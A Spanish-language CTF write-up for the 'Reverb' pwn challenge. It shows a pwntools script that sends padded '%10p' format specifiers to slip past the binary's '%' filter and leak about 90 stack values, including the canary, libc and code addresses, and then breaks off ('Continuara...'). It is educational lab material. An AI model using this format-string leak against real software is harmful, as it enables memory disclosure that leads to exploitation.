# PWN / Reverb

Parcheamos el ELF para asegurarnos que usa el mismo enlazador dinamico y libc que el remoto:
```
patchelf --set-interpreter ld-linux-x86-64.so.2 --set-rpath $(pwd) chall
chmod u+x libc.so.6 ld-linux-x86-64.so.2 chall
./chall 
>> Soy el senor Meeseeks
Soy el senor Meeseeks
```

Vemos las propiedades del ejecutable:
```
checksec --file=chall
[*] '/home/kalcast/Descargas/reverb/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Vemos el código fuente y antes de imprimir la cadena se verifica con la función check que si hay caracteres '%' en la cadena: 
+ Debe tener al menos dos dígitos después
+ Los dígitos no deben comenzar con '0'
+ La conversión de esa cadena de dígitos a un entero largo debe ser menor o igual a 58

El parámetro %p en una cadena de formato se utiliza para imprimir una dirección de memoria en formato hexadecimal, con varias podemos imprimir las direcciones de memoria en la pila. Usar %10p es lo mismo que %p solo que imprimirá con un padding de 10 caracteres.

Con esto hacemos un script para filtrar la pila:

``` python3
from pwn import *

elf = context.binary = ELF('./chall')
io = process(elf.path)

# el buffer es de 384 caracteres asi que podemos leer 384/4=96 direcciones de memoria de la pila
io.sendlineafter(b">> ",b"%10p"*90)  

stack = io.recvline(False)

# Convertir las filtraciones a un array de direcciones de memoria empaquetadas
stack = [
       p64(int(s,16))
       for s in stack.replace(b"(nil)",b"0x0").replace(b"0x",b" ").split()
]

# formatear la salida para observar mejor
for i,s in enumerate(stack):
    print(f"{i}: {s} {hex(u64(s))}")

```

```
0: b'\n\x00\x00\x00\x00\x00\x00\x00' 0xa
1: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
2: b'R\x0b\xb0\xf5\xfe\x7f\x00\x00' 0x7ffef5b00b52
3: b'\x99\x99\x99\x99\x99\x99\x99\x19' 0x1999999999999999
4: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
5: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
6: b'\xc8\x0f\xb0\xf5\xfe\x7f\x00\x00' 0x7ffef5b00fc8
7: b'\xb8\x0f\xb0\xf5\xfe\x7f\x00\x00' 0x7ffef5b00fb8
8: b'\x00\x00@\x00\x01\x00\x00\x00' 0x100400000
9: b'%10p%10p' 0x7030312570303125
10: b'%10p%10p' 0x7030312570303125
11: b'%10p%10p' 0x7030312570303125
12: b'%10p%10p' 0x7030312570303125
13: b'%10p%10p' 0x7030312570303125
14: b'%10p%10p' 0x7030312570303125
15: b'%10p%10p' 0x7030312570303125
16: b'%10p%10p' 0x7030312570303125
17: b'%10p%10p' 0x7030312570303125
18: b'%10p%10p' 0x7030312570303125
19: b'%10p%10p' 0x7030312570303125
20: b'%10p%10p' 0x7030312570303125
21: b'%10p%10p' 0x7030312570303125
22: b'%10p%10p' 0x7030312570303125
23: b'%10p%10p' 0x7030312570303125
24: b'%10p%10p' 0x7030312570303125
25: b'%10p%10p' 0x7030312570303125
26: b'%10p%10p' 0x7030312570303125
27: b'%10p%10p' 0x7030312570303125
28: b'%10p%10p' 0x7030312570303125
29: b'%10p%10p' 0x7030312570303125
30: b'%10p%10p' 0x7030312570303125
31: b'%10p%10p' 0x7030312570303125
32: b'%10p%10p' 0x7030312570303125
33: b'%10p%10p' 0x7030312570303125
34: b'%10p%10p' 0x7030312570303125
35: b'%10p%10p' 0x7030312570303125
36: b'%10p%10p' 0x7030312570303125
37: b'%10p%10p' 0x7030312570303125
38: b'%10p%10p' 0x7030312570303125
39: b'%10p%10p' 0x7030312570303125
40: b'%10p%10p' 0x7030312570303125
41: b'%10p%10p' 0x7030312570303125
42: b'%10p%10p' 0x7030312570303125
43: b'%10p%10p' 0x7030312570303125
44: b'%10p%10p' 0x7030312570303125
45: b'%10p%10p' 0x7030312570303125
46: b'%10p%10p' 0x7030312570303125
47: b'%10p%10p' 0x7030312570303125
48: b'%10p%10p' 0x7030312570303125
49: b'%10p%10p' 0x7030312570303125
50: b'%10p%10p' 0x7030312570303125
51: b'%10p%10p' 0x7030312570303125
52: b'%10p%10p' 0x7030312570303125
53: b'%10p%10p' 0x7030312570303125
54: b'\n\x00\x00\x00\x00\x00\x00\x00' 0xa
55: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
56: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
57: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
58: b'\x00\x07\xc4\xa2\xa7\x81\xf9\xcc' 0xccf981a7a2c40700
59: b'\x01\x00\x00\x00\x00\x00\x00\x00' 0x1
60: b'\x90\x9d"gW\x7f\x00\x00' 0x7f5767229d90
61: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
62: b'z\x13@\x00\x00\x00\x00\x00' 0x40137a
63: b'\x00\x00\x00\x00\x01\x00\x00\x00' 0x100000000
64: b'\xb8\x0f\xb0\xf5\xfe\x7f\x00\x00' 0x7ffef5b00fb8
65: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
66: b'\xa6(6\xad)O5\xc9' 0xc9354f29ad3628a6
67: b'\xb8\x0f\xb0\xf5\xfe\x7f\x00\x00' 0x7ffef5b00fb8
68: b'z\x13@\x00\x00\x00\x00\x00' 0x40137a
69: b'\x18>@\x00\x00\x00\x00\x00' 0x403e18
70: b'@ ]gW\x7f\x00\x00' 0x7f57675d2040
71: b'\xa6(T\xb0I\xa4\xc86' 0x36c8a449b05428a6
72: b'\xa6(\xbc\x97l\x81\x9b7' 0x379b816c97bc28a6
73: b'\x00\x00\x00\x00W\x7f\x00\x00' 0x7f5700000000
74: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
75: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
76: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
77: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
78: b'\x00\x07\xc4\xa2\xa7\x81\xf9\xcc' 0xccf981a7a2c40700
79: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
80: b'@\x9e"gW\x7f\x00\x00' 0x7f5767229e40
81: b'\xc8\x0f\xb0\xf5\xfe\x7f\x00\x00' 0x7ffef5b00fc8
82: b'\x18>@\x00\x00\x00\x00\x00' 0x403e18
83: b'\xe02]gW\x7f\x00\x00' 0x7f57675d32e0
84: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
85: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
86: b'\xd0\x10@\x00\x00\x00\x00\x00' 0x4010d0
87: b'\xb0\x0f\xb0\xf5\xfe\x7f\x00\x00' 0x7ffef5b00fb0
88: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
89: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
```

### Continuara...
